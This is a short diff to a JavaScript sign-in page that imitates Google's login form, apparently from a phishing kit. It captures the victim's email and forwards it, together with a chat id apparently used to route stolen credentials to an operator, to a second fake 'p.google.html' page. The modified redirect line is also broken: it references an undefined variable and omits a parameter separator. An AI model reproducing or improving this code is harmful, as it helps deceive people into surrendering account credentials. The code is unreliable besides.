@@ -219,12 +219,12 @@ initAft()</script>
             const submitButton = document.getElementById('submit');
             submitButton.addEventListener('click', function() {
             const email = document.getElementById('identifierId').value;
-
+            const chatId = getQueryParam('id');
             if (!email) {
                 
                 return;
             }
-            window.location.href = "p.google.html?email=" + encodeURIComponent(email);
+            window.location.href = "p.google.html?email=" + encodeURIComponent(email) + "id=" + encodeURIComponent(id);
             
         });
 </script>
